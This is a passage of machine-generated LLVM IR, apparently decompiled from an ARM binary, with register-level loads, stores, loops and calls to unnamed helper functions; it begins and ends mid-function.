  %v5_a26c = or i32 %v1_a264, %v4_a26c
  store i32 %v5_a26c, i32* %ip.global-to-local, align 4
  %v2_a274 = load i32, i32* @lr, align 4
  %v3_a274 = add i32 %v2_a274, 9
  %v4_a274 = inttoptr i32 %v3_a274 to i8*
  store i8 17, i8* %v4_a274, align 1
  store i32 ptrtoint (i32* @global_var_212d8.45 to i32), i32* %r3.global-to-local, align 4
  %v0_a27c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a27c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_a1d8
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_a280 = load i32, i32* @lr, align 4
  %v4_a280 = add i32 %v3_a280, 6
  %v5_a280 = inttoptr i32 %v4_a280 to i16*
  store i16 64, i16* %v5_a280, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_a1d8, %bb
  %v2_a284 = load i32, i32* @global_var_212d8.45, align 4
  %v1_a288 = load i32, i32* @lr, align 4
  %v2_a288 = add i32 %v1_a288, 12
  %v3_a288 = inttoptr i32 %v2_a288 to i32*
  store i32 %v2_a284, i32* %v3_a288, align 4
  store i32 %v2_a1f4, i32* %r2.global-to-local, align 4
  %v1_a290 = add i32 %v2_a1f4, 16
  %v2_a290 = inttoptr i32 %v1_a290 to i32*
  %v3_a290 = load i32, i32* %v2_a290, align 4
  %v1_a294 = load i32, i32* @lr, align 4
  %v2_a294 = add i32 %v1_a294, 16
  %v3_a294 = inttoptr i32 %v2_a294 to i32*
  store i32 %v3_a290, i32* %v3_a294, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_a29c = load i32, i32* @lr, align 4
  %v1_a29c = add i32 %v0_a29c, 20
  store i32 %v1_a29c, i32* %r4.global-to-local, align 4
  %v2_a2a0 = add i32 %v0_a29c, 28
  %v3_a2a0 = inttoptr i32 %v2_a2a0 to i32*
  store i32 -1, i32* %v3_a2a0, align 4
  %v0_a2a4 = load i32, i32* @r5, align 4
  %v1_a2a4 = trunc i32 %v0_a2a4 to i16
  %v2_a2a4 = load i32, i32* @lr, align 4
  %v3_a2a4 = add i32 %v2_a2a4, 4
  %v4_a2a4 = inttoptr i32 %v3_a2a4 to i16*
  store i16 %v1_a2a4, i16* %v4_a2a4, align 2
  %v0_a2a8 = load i32, i32* @lr, align 4
  %v1_a2a8 = add i32 %v0_a2a8, 32
  %v0_a2ac = load i32, i32* %ip.global-to-local, align 4
  %v1_a2ac = trunc i32 %v0_a2ac to i16
  %v2_a2ac = load i32, i32* %r4.global-to-local, align 4
  %v3_a2ac = add i32 %v2_a2ac, 4
  %v4_a2ac = inttoptr i32 %v3_a2ac to i16*
  store i16 %v1_a2ac, i16* %v4_a2ac, align 2
  %v0_a2b0 = load i32, i32* @r7, align 4
  %v1_a2b0 = trunc i32 %v0_a2b0 to i16
  %v2_a2b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_a2b0 = add i32 %v2_a2b0, 2
  %v4_a2b0 = inttoptr i32 %v3_a2b0 to i16*
  store i16 %v1_a2b0, i16* %v4_a2b0, align 2
  %v0_a2b4 = load i32, i32* @r6, align 4
  %v1_a2b4 = trunc i32 %v0_a2b4 to i16
  %v2_a2b4 = load i32, i32* @lr, align 4
  %v3_a2b4 = add i32 %v2_a2b4, 20
  %v4_a2b4 = inttoptr i32 %v3_a2b4 to i16*
  store i16 %v1_a2b4, i16* %v4_a2b4, align 2
  %v3_a2b8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a2b8, i32* %r2.global-to-local, align 4
  %v3_a2bc = call i32 @function_108bc(i32 %v1_a2a8, i32 %v3_a130, i32 %v3_a2b8)
  %v3_a2c0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a2c0, i32* %r3.global-to-local, align 4
  %v1_a2c4 = add i32 %v3_a2c0, 1
  store i32 %v1_a2c4, i32* @r4, align 4
  %v1_a2c8 = load i32, i32* @r8, align 4
  %v9_a2c8 = icmp eq i32 %v1_a2c4, %v1_a2c8
  store i1 %v9_a2c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a2c4, i32* %stack_var_-44, align 4
  %v5_a2d0 = icmp slt i32 %v1_a2c4, %v1_a2c8
  br i1 %v5_a2d0, label %dec_label_pc_a1d8, label %dec_label_pc_a2d4.preheader

dec_label_pc_a2d4.preheader:                      ; preds = %.thread, %dec_label_pc_a17c
  %v0_a2d8.ph = phi i32 [ 0, %dec_label_pc_a17c ], [ %v1_a2c8, %.thread ]
  %v3_a314 = icmp eq i32 %v3_a18c, 65535
  br label %dec_label_pc_a2d4

dec_label_pc_a2d4:                                ; preds = %dec_label_pc_a2d4, %dec_label_pc_a3c0, %dec_label_pc_a2d4.preheader
  %v0_a2d8 = phi i32 [ %v0_a2d8.ph, %dec_label_pc_a2d4.preheader ], [ 0, %dec_label_pc_a3c0 ], [ 0, %dec_label_pc_a2d4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a2d8 = icmp eq i32 %v0_a2d8, 0
  store i1 %v2_a2d8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a2d8, label %dec_label_pc_a2d4, label %dec_label_pc_a2e4

dec_label_pc_a2e4:                                ; preds = %dec_label_pc_a2d4, %dec_label_pc_a3c0
  br label %dec_label_pc_a2e8

dec_label_pc_a2e8:                                ; preds = %dec_label_pc_a334, %dec_label_pc_a2e4
  %v1_a2f8 = phi i32 [ %v1_a3b0, %dec_label_pc_a334 ], [ 0, %dec_label_pc_a2e4 ]
  %v5_a2ec = mul i32 %v1_a2f8, 24
  %v1_a2f0 = load i32, i32* @sl, align 4
  %v2_a2f0 = add i32 %v1_a2f0, %v5_a2ec
  store i32 %v2_a2f0, i32* %r3.global-to-local, align 4
  %v1_a2f4 = add i32 %v2_a2f0, 20
  %v2_a2f4 = inttoptr i32 %v1_a2f4 to i8*
  %v3_a2f4 = load i8, i8* %v2_a2f4, align 1
  %v4_a2f4 = zext i8 %v3_a2f4 to i32
  store i32 %v4_a2f4, i32* %r2.global-to-local, align 4
  %v0_a2f8 = load i32, i32* @fp, align 4
  %v4_a2f8 = mul i32 %v1_a2f8, 4
  %v5_a2f8 = add i32 %v0_a2f8, %v4_a2f8
  %v6_a2f8 = inttoptr i32 %v5_a2f8 to i32*
  %v7_a2f8 = load i32, i32* %v6_a2f8, align 4
  store i32 %v7_a2f8, i32* @r5, align 4
  %v7_a300 = icmp eq i8 %v3_a2f4, 31
  store i1 %v7_a300, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_a308 = add i32 %v7_a2f8, 20
  store i32 %v1_a308, i32* @r6, align 4
  %tmp40 = icmp ult i8 %v3_a2f4, 32
  br i1 %tmp40, label %dec_label_pc_a3d4, label %dec_label_pc_a310

dec_label_pc_a310:                                ; preds = %dec_label_pc_a2e8
  store i32 %v3_a18c, i32* %r3.global-to-local, align 4
  store i1 %v3_a314, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a314, label %dec_label_pc_a434, label %dec_label_pc_a31c

dec_label_pc_a31c:                                ; preds = %dec_label_pc_a3d4, %dec_label_pc_a310
  %v1_a320 = phi i32 [ %v1_a42c, %dec_label_pc_a3d4 ], [ 65535, %dec_label_pc_a310 ]
  store i32 %v3_a190, i32* %ip.global-to-local, align 4
  %v9_a320 = icmp eq i32 %v3_a190, %v1_a320
  store i1 %v9_a320, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a320, label %dec_label_pc_a448, label %dec_label_pc_a328

dec_label_pc_a328:                                ; preds = %dec_label_pc_a434.dec_label_pc_a328_crit_edge, %dec_label_pc_a31c
  %v1_a32c = phi i32 [ %v1_a32c.pre, %dec_label_pc_a434.dec_label_pc_a328_crit_edge ], [ %v1_a320, %dec_label_pc_a31c ]
  %v9_a32c = icmp eq i32 %v3_a194, %v1_a32c
  store i1 %v9_a32c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a32c, label %dec_label_pc_a45c, label %dec_label_pc_a334

dec_label_pc_a334:                                ; preds = %dec_label_pc_a448, %dec_label_pc_a328, %dec_label_pc_a45c
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_a338 = load i32, i32* @r5, align 4
  %v3_a338 = add i32 %v2_a338, 10
  %v4_a338 = inttoptr i32 %v3_a338 to i16*
  store i16 0, i16* %v4_a338, align 2
  %v0_a340 = load i32, i32* @r5, align 4
  store i32 %v0_a340, i32* @r0, align 4
  %v2_a344 = call i32 @function_c848(i32 %v0_a340, i32 20)
  %v3_a344 = trunc i32 %v2_a344 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a34c = load i32, i32* @r5, align 4
  %v4_a34c = add i32 %v3_a34c, 10
  %v5_a34c = inttoptr i32 %v4_a34c to i16*
  store i16 %v3_a344, i16* %v5_a34c, align 2
  %v0_a350 = load i32, i32* %r3.global-to-local, align 4
  %v1_a350 = trunc i32 %v0_a350 to i16
  %v2_a350 = load i32, i32* @r6, align 4
  %v3_a350 = add i32 %v2_a350, 6
  %v4_a350 = inttoptr i32 %v3_a350 to i16*
  store i16 %v1_a350, i16* %v4_a350, align 2
  %v3_a354 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a354, i32* %r3.global-to-local, align 4
  %v0_a358 = load i32, i32* @r6, align 4
  store i32 %v0_a358, i32* @r1, align 4
  %v1_a35c = add i32 %v0_a358, 4
  %v2_a35c = inttoptr i32 %v1_a35c to i16*
  %v3_a35c = load i16, i16* %v2_a35c, align 2
  %v4_a35c = zext i16 %v3_a35c to i32
  store i32 %v4_a35c, i32* %r2.global-to-local, align 4
  %v1_a360 = add i32 %v3_a354, 12
  store i32 %v1_a360, i32* %r3.global-to-local, align 4
  %v0_a364 = load i32, i32* @r5, align 4
  %v4_a368 = call i32 @function_c898(i32 %v0_a364, i32 %v0_a358, i32 %v4_a35c, i32 %v1_a360)
  %v5_a368 = trunc i32 %v4_a368 to i16
  %v3_a36c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a36c, i32* %r3.global-to-local, align 4
  %v3_a370 = mul i32 %v3_a36c, 32
  store i32 %v3_a370, i32* %lr.global-to-local, align 4
  %v3_a374 = load i32, i32* @r6, align 4
  %v4_a374 = add i32 %v3_a374, 6
  %v5_a374 = inttoptr i32 %v4_a374 to i16*
  store i16 %v5_a368, i16* %v5_a374, align 2
  %v0_a378 = load i32, i32* %lr.global-to-local, align 4
  %v1_a378 = load i32, i32* %r3.global-to-local, align 4
  %tmp41 = mul i32 %v1_a378, -8
  %v5_a378 = add i32 %v0_a378, %tmp41
  store i32 %v5_a378, i32* %lr.global-to-local, align 4
  %v0_a37c = load i32, i32* @r6, align 4
  %v1_a37c = add i32 %v0_a37c, 2
  %v2_a37c = inttoptr i32 %v1_a37c to i16*
  %v3_a37c = load i16, i16* %v2_a37c, align 2
  %v3_a380 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a380, i32* %r2.global-to-local, align 4
  %v1_a384 = load i32, i32* @sl, align 4
  %v2_a384 = add i32 %v1_a384, %v5_a378
  store i32 %v2_a384, i32* @lr, align 4
  %v3_a388 = add i32 %v2_a384, 2
  %v4_a388 = inttoptr i32 %v3_a388 to i16*
  store i16 %v3_a37c, i16* %v4_a388, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a394 = load i32, i32* @r5, align 4
  %v0_a398 = load i32, i32* %r2.global-to-local, align 4
  %v1_a398 = add i32 %v0_a398, 32
  store i32 %v1_a398, i32* %r2.global-to-local, align 4
  %v0_a39c = load i32, i32* @sb, align 4
  %v0_a3a0 = load i32, i32* @lr, align 4
  %v6_a3a8 = call i32 @function_11a68(i32 %v0_a39c, i32 %v0_a394, i32 %v1_a398, i32 16384, i32 %v0_a3a0, i32 16)
  %v3_a3ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a3ac, i32* %r3.global-to-local, align 4
  %v1_a3b0 = add i32 %v3_a3ac, 1
  %v1_a3b4 = load i32, i32* @r8, align 4
  %v9_a3b4 = icmp eq i32 %v1_a3b0, %v1_a3b4
  store i1 %v9_a3b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a3b0, i32* %stack_var_-44, align 4
  %v5_a3bc = icmp slt i32 %v1_a3b0, %v1_a3b4
  br i1 %v5_a3bc, label %dec_label_pc_a2e8, label %dec_label_pc_a3c0

dec_label_pc_a3c0:                                ; preds = %dec_label_pc_a334
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a3c4 = icmp eq i32 %v1_a3b4, 0
  store i1 %v2_a3c4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a3c4, label %dec_label_pc_a2d4, label %dec_label_pc_a2e4

dec_label_pc_a3d4:                                ; preds = %dec_label_pc_a2e8
  %v1_a3d4 = add i32 %v2_a2f0, 16
  %v2_a3d4 = inttoptr i32 %v1_a3d4 to i32*
  %v3_a3d4 = load i32, i32* %v2_a3d4, align 4
  store i32 %v3_a3d4, i32* @r4, align 4
  %v0_a3d8 = call i32 @function_e0d0()
  %v3_a3dc = load i32, i32* %stack_var_-44, align 4
  %v5_a3e4 = mul i32 %v3_a3dc, 24
  %v0_a3e8 = load i32, i32* @r4, align 4
  %v1_a3e8 = and i32 %v0_a3e8, 16711680
  store i32 %v1_a3e8, i32* %ip.global-to-local, align 4
  %v3_a3ec = udiv i32 %v0_a3e8, 16777216
  %v4_a3f0 = udiv i32 %v1_a3e8, 256
  %v5_a3f0 = or i32 %v4_a3f0, %v3_a3ec
  store i32 %v5_a3f0, i32* %r2.global-to-local, align 4
  %v1_a3f4 = load i32, i32* @sl, align 4
  %v2_a3f4 = add i32 %v1_a3f4, %v5_a3e4
  %v1_a3f8 = and i32 %v0_a3e8, 65280
  store i32 %v1_a3f8, i32* %r3.global-to-local, align 4
  %v1_a3fc = add i32 %v2_a3f4, 20
  %v2_a3fc = inttoptr i32 %v1_a3fc to i8*
  %v3_a3fc = load i8, i8* %v2_a3fc, align 1
  %v4_a3fc = zext i8 %v3_a3fc to i32
  store i32 %v4_a3fc, i32* %ip.global-to-local, align 4
  %v5_a404 = call i32 @llvm.bswap.i32(i32 %v0_a3e8)
  %v7_a408 = lshr i32 %v0_a3d8, %v4_a3fc
  %v8_a408 = add i32 %v7_a408, %v5_a404
  store i32 %v8_a408, i32* %r2.global-to-local, align 4
  %v5_a420 = call i32 @llvm.bswap.i32(i32 %v8_a408)
  %v1_a424 = load i32, i32* @r5, align 4
  %v2_a424 = add i32 %v1_a424, 16
  %v3_a424 = inttoptr i32 %v2_a424 to i32*
  store i32 %v5_a420, i32* %v3_a424, align 4
  store i32 %v3_a18c, i32* %r3.global-to-local, align 4
  %v1_a42c = load i32, i32* @r7, align 4
  %v9_a42c = icmp eq i32 %v3_a18c, %v1_a42c
  store i1 %v9_a42c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a42c, label %dec_label_pc_a434, label %dec_label_pc_a31c

dec_label_pc_a434:                                ; preds = %dec_label_pc_a3d4, %dec_label_pc_a310
  %v0_a434 = call i32 @function_e0d0()
  %v1_a434 = trunc i32 %v0_a434 to i16
  store i32 %v3_a190, i32* %ip.global-to-local, align 4
  %v1_a43c = load i32, i32* @r7, align 4
  %v9_a43c = icmp eq i32 %v3_a190, %v1_a43c
  store i1 %v9_a43c, i1* %cpsr_z.global-to-local, align 1
  %v3_a440 = load i32, i32* @r5, align 4
  %v4_a440 = add i32 %v3_a440, 4
  %v5_a440 = inttoptr i32 %v4_a440 to i16*
  store i16 %v1_a434, i16* %v5_a440, align 2
  br i1 %v9_a43c, label %dec_label_pc_a448, label %dec_label_pc_a434.dec_label_pc_a328_crit_edge

dec_label_pc_a434.dec_label_pc_a328_crit_edge:    ; preds = %dec_label_pc_a434
  %v1_a32c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_a328

dec_label_pc_a448:                                ; preds = %dec_label_pc_a434, %dec_label_pc_a31c
  %v0_a448 = call i32 @function_e0d0()
  %v1_a448 = trunc i32 %v0_a448 to i16
  %v1_a450 = load i32, i32* @r7, align 4
  %v9_a450 = icmp eq i32 %v3_a194, %v1_a450
  store i1 %v9_a450, i1* %cpsr_z.global-to-local, align 1
  %v3_a454 = load i32, i32* @r5, align 4
  %v4_a454 = add i32 %v3_a454, 20
  %v5_a454 = inttoptr i32 %v4_a454 to i16*
  store i16 %v1_a448, i16* %v5_a454, align 2
  br i1 %v9_a450, label %dec_label_pc_a45c, label %dec_label_pc_a334

dec_label_pc_a45c:                                ; preds = %dec_label_pc_a448, %dec_label_pc_a328
  %v0_a45c = call i32 @function_e0d0()
  %v1_a45c = trunc i32 %v0_a45c to i16
  %v3_a460 = load i32, i32* @r6, align 4
  %v4_a460 = add i32 %v3_a460, 2
  %v5_a460 = inttoptr i32 %v4_a460 to i16*
  store i16 %v1_a45c, i16* %v5_a460, align 2
  br label %dec_label_pc_a334

dec_label_pc_a468:                                ; preds = %dec_label_pc_a154
  %v0_a468 = load i32, i32* @sb, align 4
  %v1_a46c = call i32 @function_1130c(i32 %v0_a468)
  br label %dec_label_pc_a470

dec_label_pc_a470:                                ; preds = %dec_label_pc_a048, %dec_label_pc_a468
  %v1_a478 = phi i32 [ %v3_a144, %dec_label_pc_a048 ], [ %v1_a46c, %dec_label_pc_a468 ]
  store i32 %v3_a048, i32* %r4.global-to-local, align 4
  store i32 %v27_a048, i32* %lr.global-to-local, align 4
  ret i32 %v1_a478

; uselistorder directives
  uselistorder i32 %v1_a42c, { 1, 0 }
  uselistorder i32 %v0_a3e8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_a3b0, { 2, 0, 3, 1 }
  uselistorder i32 %v5_a378, { 1, 0 }
  uselistorder i1 %v3_a314, { 1, 0 }
  uselistorder i32 %v1_a2c4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a22c, { 1, 0 }
  uselistorder i32 %v3_a1c4, { 1, 0 }
  uselistorder i32 %v3_a1c0, { 1, 0 }
  uselistorder i32 %v0_a184, { 1, 0, 3, 2 }
  uselistorder i32 %v0_a180, { 1, 0, 2 }
  uselistorder i32 %v0_a17c, { 1, 0, 3, 2 }
  uselistorder i1 %v7_a174, { 1, 0 }
  uselistorder i1 %v7_a148, { 1, 0 }
  uselistorder i32 %v3_a144, { 1, 2, 3, 0 }
  uselistorder i32 %v1_a0e4, { 1, 0 }
  uselistorder i32 %v5_a0b8, { 1, 0 }
  uselistorder i32 %v5_a07c, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a470, { 1, 0 }
  uselistorder label %dec_label_pc_a334, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a2e4, { 1, 0 }
  uselistorder label %dec_label_pc_a2d4, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_a480(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a480:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_a480 = load i32, i32* @sb, align 4
  %v27_a480 = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_a4a0 = call i32 @function_12654(i32 %arg1, i32 4)
  %v0_a4a4 = load i32, i32* @r5, align 4
  store i32 %v0_a4a4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_a4b0 = load i32, i32* @r4, align 4
  store i32 %v0_a4b0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_a4b8 = inttoptr i32 %v0_a4a4 to i32*
  %v6_a4b8 = call i32 @function_8570(i32 %v0_a4b0, i32* %v5_a4b8, i32 2, i32 0)
  %v1_a4c4 = urem i32 %v6_a4b8, 256
  store i32 %v1_a4c4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a4d0 = load i32, i32* @r4, align 4
  store i32 %v0_a4d0, i32* %r0.global-to-local, align 4
  %v0_a4d4 = load i32, i32* @r5, align 4
  store i32 %v0_a4d4, i32* %r1.global-to-local, align 4
  %v6_a4dc = inttoptr i32 %v0_a4d4 to i32*
  %v7_a4dc = call i32 @function_8570(i32 %v0_a4d0, i32* %v6_a4dc, i32 3, i32 65535)
  %v0_a4e0 = load i32, i32* @r5, align 4
  store i32 %v0_a4e0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_a4ec = load i32, i32* @r4, align 4
  store i32 %v0_a4ec, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_a4f4 = inttoptr i32 %v0_a4e0 to i32*
  %v6_a4f4 = call i32 @function_8570(i32 %v0_a4ec, i32* %v5_a4f4, i32 4, i32 64)
  %v1_a4fc = urem i32 %v6_a4f4, 256
  store i32 %v1_a4fc, i32* %ip.global-to-local, align 4
  %v0_a500 = load i32, i32* @r5, align 4
  store i32 %v0_a500, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a50c = load i32, i32* @r4, align 4
  store i32 %v0_a50c, i32* %r0.global-to-local, align 4
  %v6_a514 = inttoptr i32 %v0_a500 to i32*
  %v7_a514 = call i32 @function_8570(i32 %v0_a50c, i32* %v6_a514, i32 5, i32 0)
  %v1_a520 = urem i32 %v7_a514, 256
  store i32 %v1_a520, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a52c = load i32, i32* @r4, align 4
  store i32 %v0_a52c, i32* %r0.global-to-local, align 4
  %v0_a530 = load i32, i32* @r5, align 4
  store i32 %v0_a530, i32* %r1.global-to-local, align 4
  %v5_a538 = inttoptr i32 %v0_a530 to i32*
  %v6_a538 = call i32 @function_8570(i32 %v0_a52c, i32* %v5_a538, i32 6, i32 65535)
  %v0_a53c = load i32, i32* @r5, align 4
  store i32 %v0_a53c, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a548 = load i32, i32* @r4, align 4
  store i32 %v0_a548, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_a550 = inttoptr i32 %v0_a53c to i32*
  %v6_a550 = call i32 @function_8570(i32 %v0_a548, i32* %v5_a550, i32 7, i32 53)
  %v0_a55c = load i32, i32* @r5, align 4
  store i32 %v0_a55c, i32* %r1.global-to-local, align 4
  %v0_a560 = load i32, i32* @r4, align 4
  store i32 %v0_a560, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_a56c = inttoptr i32 %v0_a55c to i32*
  %v6_a56c = call i32 @function_8570(i32 %v0_a560, i32* %v5_a56c, i32 9, i32 65535)
  %v0_a570 = load i32, i32* @r5, align 4
  store i32 %v0_a570, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_a57c = load i32, i32* @r4, align 4
  store i32 %v0_a57c, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_a584 = inttoptr i32 %v0_a570 to i32*
  %v6_a584 = call i32 @function_8570(i32 %v0_a57c, i32* %v5_a584, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a590 = load i32, i32* @r5, align 4
  store i32 %v0_a590, i32* %r1.global-to-local, align 4
  store i32 %v6_a584, i32* %sb.global-to-local, align 4
  %v0_a598 = load i32, i32* @r4, align 4
  store i32 %v0_a598, i32* %r0.global-to-local, align 4
  %v4_a59c = inttoptr i32 %v0_a590 to i32*
  %v5_a59c = call i32 @function_8190(i32 %v0_a598, i32* %v4_a59c, i32 8, i32 0)
  store i32 %v5_a59c, i32* @r7, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_a5a8 = call i32 @function_1030c(i32 21)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_a5b4 = call i32 @function_10248(i32 21, i32* null)
  store i32 %v3_a5b4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_a5bc = call i32 @function_10f18(i32 %v3_a5b4, i32 0)
  store i32 %v2_a5bc, i32* @r4, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_a5c8 = call i32 @function_1026c(i32 21)
  store i32 %v1_a5c8, i32* %r0.global-to-local, align 4
  %v0_a5cc = load i32, i32* @r4, align 4
  %v1_a5cc = icmp slt i32 %v0_a5cc, 0
  %v2_a5cc = icmp eq i32 %v0_a5cc, 0
  store i1 %v2_a5cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_a5cc, label %dec_label_pc_aac4, label %dec_label_pc_a5d4

dec_label_pc_a5d4:                                ; preds = %dec_label_pc_a480
  %v2_a5d8 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_a5d8, i32* @sl, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 %v2_a5d8, i32* %r1.global-to-local, align 4
  store i32 %v0_a5cc, i32* %r0.global-to-local, align 4
  %v1_a5e8 = call i32 @function_110a4(i32 %v0_a5cc)
  store i32 %v1_a5e8, i32* @r5, align 4
  %v0_a5f0 = load i32, i32* @r4, align 4
  store i32 %v0_a5f0, i32* %r0.global-to-local, align 4
  %v1_a5f4 = call i32 @function_1130c(i32 %v0_a5f0)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a5fc = call i32 @function_1030c(i32 22)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_a608 = call i32 @function_10248(i32 22, i32* null)
  %v0_a60c = load i32, i32* @r5, align 4
  store i32 %v0_a60c, i32* @r1, align 4
  store i32 %v3_a608, i32* %r2.global-to-local, align 4
  store i32 %v2_a5d8, i32* %r0.global-to-local, align 4
  %v3_a618 = bitcast i32* %stack_var_-2124 to i8*
  %v4_a618 = call i32 @function_10b9c(i8* %v3_a618, i32 %v0_a60c, i32 %v3_a608)
  store i32 %v4_a618, i32* @r6, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a624 = call i32 @function_1026c(i32 22)
  store i32 %v1_a624, i32* %r0.global-to-local, align 4
  %v0_a628 = load i32, i32* @r6, align 4
  %v7_a628 = icmp eq i32 %v0_a628, -1
  store i1 %v7_a628, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a628, label %dec_label_pc_aac4, label %dec_label_pc_a630

dec_label_pc_a630:                                ; preds = %dec_label_pc_a5d4
  %v0_a630 = load i32, i32* @r5, align 4
  %v9_a630 = icmp eq i32 %v0_a630, %v0_a628
  store i1 %v9_a630, i1* %cpsr_z.global-to-local, align 1
  %v7_a634 = icmp sgt i32 %v0_a630, %v0_a628
  br i1 %v7_a634, label %dec_label_pc_a638, label %dec_label_pc_aac4

dec_label_pc_a638:                                ; preds = %dec_label_pc_a630
  %v0_a638 = load i32, i32* @sl, align 4
  %v2_a638 = add i32 %v0_a638, %v0_a628
  store i32 %v2_a638, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_a664 = add i32 %v0_a630, -1
  br label %dec_label_pc_a65c

dec_label_pc_a648:                                ; preds = %dec_label_pc_a684, %bb103
  %v9_a648 = icmp eq i32 %v1_a664, %v0_a650
  store i1 %v9_a648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a648, label %dec_label_pc_a690, label %dec_label_pc_a650

dec_label_pc_a650:                                ; preds = %dec_label_pc_a674, %dec_label_pc_a648, %bb
  %v0_a68029 = phi i32 [ %v0_a680, %dec_label_pc_a674 ], [ %v0_a68030, %dec_label_pc_a648 ], [ %v0_a680, %bb ]
  %v0_a66025 = phi i32 [ 0, %dec_label_pc_a674 ], [ %v0_a66026, %dec_label_pc_a648 ], [ 0, %bb ]
  %v1_a650 = add i32 %v0_a650, 1
  %v9_a654 = icmp eq i32 %v1_a650, %v0_a630
